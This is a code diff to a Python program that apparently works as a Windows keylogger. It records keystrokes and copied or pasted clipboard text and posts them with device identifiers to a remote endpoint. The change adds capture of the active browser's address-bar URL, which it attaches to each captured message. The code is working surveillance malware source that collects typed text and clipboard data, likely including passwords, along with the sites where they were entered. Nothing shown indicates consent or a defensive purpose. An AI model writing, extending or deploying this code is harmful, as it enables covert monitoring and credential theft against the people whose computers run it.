@@ -13,6 +13,7 @@ import sys
 import ctypes
 import tempfile
 import uuid
+from urllib.parse import urlparse
 from ctypes import wintypes
 from queue import Queue
 from threading import Lock, Thread, Timer
@@ -56,6 +57,7 @@ PENDING_MESSAGES_PATH = os.path.join(INSTALL_DIR, "pending_messages.json")
 PENDING_RAW_BATCHES_PATH = os.path.join(INSTALL_DIR, "pending_raw_batches.json")
 SESSION_ID = uuid.uuid4().hex
 pending_messages_lock = Lock()
+last_message_id = 0
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -118,6 +120,37 @@ def get_active_target():
         return target, target_key
     except Exception:
         return app_name, app_name
+
+
+def get_browser_url(app_name):
+    if os.name != "nt" or Desktop is None:
+        return ""
+    browser_names = ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
+    executable = app_name.split(" - ", 1)[0].strip().lower()
+    if executable not in browser_names:
+        return ""
+
+    try:
+        window = Desktop(backend="uia").get_active()
+        for control in window.descendants(control_type="Edit"):
+            name = " ".join(
+                (
+                    control.window_text(),
+                    control.element_info.name,
+                    control.element_info.automation_id,
+                )
+            ).lower()
+            if not any(marker in name for marker in ("address", "search", "url", "location")):
+                continue
+            value = (control.window_text() or control.element_info.name or "").strip()
+            if not value.startswith(("http://", "https://")):
+                continue
+            parsed = urlparse(value)
+            if parsed.scheme in ("http", "https") and parsed.netloc:
+                return value
+    except Exception:
+        return ""
+    return ""
 
 
 def get_clipboard_text():
@@ -340,13 +373,17 @@ def post_message(payload, quiet=False):
         return False
 
 
-def send_message(text, app_name, raw_text=None, is_pasted=False, is_copied=False, raw_only=False):
+def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False, raw_only=False):
+    global last_message_id
+    last_message_id = max(last_message_id + 1, int(time.time() * 1000))
     payload = {
+        "message_id": last_message_id,
         "text": text,
         "raw_text": raw_text if raw_text is not None else text,
         "device_id": device_id,
         "device_name": device_name,
         "app_name": app_name,
+        "source_url": source_url,
         "is_pasted": is_pasted,
         "is_copied": is_copied,
         "raw_only": raw_only,
@@ -455,8 +492,8 @@ def message_sender():
     last_retry_at = 0
     while True:
         try:
-            text, app_name, raw_text, is_pasted, is_copied, raw_only = message_queue.get(timeout=5)
-            send_message(text, app_name, raw_text, is_pasted, is_copied, raw_only)
+            text, app_name, source_url, raw_text, is_pasted, is_copied, raw_only = message_queue.get(timeout=5)
+            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied, raw_only)
             message_queue.task_done()
         except Exception:
             pass
@@ -493,7 +530,7 @@ def queue_copied_clipboard(target):
     time.sleep(0.1)
     copied_text = get_clipboard_text().strip()
     if copied_text:
-        message_queue.put((copied_text, target, copied_text, False, True, False))
+        message_queue.put((copied_text, target, get_browser_url(target), copied_text, False, True, False))
 
 
 def flush_message_buffer():
@@ -506,7 +543,8 @@ def flush_message_buffer():
     last_key_time_ms = None
     message_started_ms = None
     if text:
-        message_queue.put((text, active_target or get_active_app(), raw_text, False, False, False))
+        target = active_target or get_active_app()
+        message_queue.put((text, target, get_browser_url(target), raw_text, False, False, False))
     active_target = None
     active_target_key = None
 
@@ -543,7 +581,7 @@ def on_press(key):
             if pasted_text:
                 flush_message_buffer()
                 target, target_key = get_active_target()
-                message_queue.put((pasted_text, target, pasted_text, True, False, False))
+                message_queue.put((pasted_text, target, get_browser_url(target), pasted_text, True, False, False))
             return
 
         symbol = normalize_key(key)
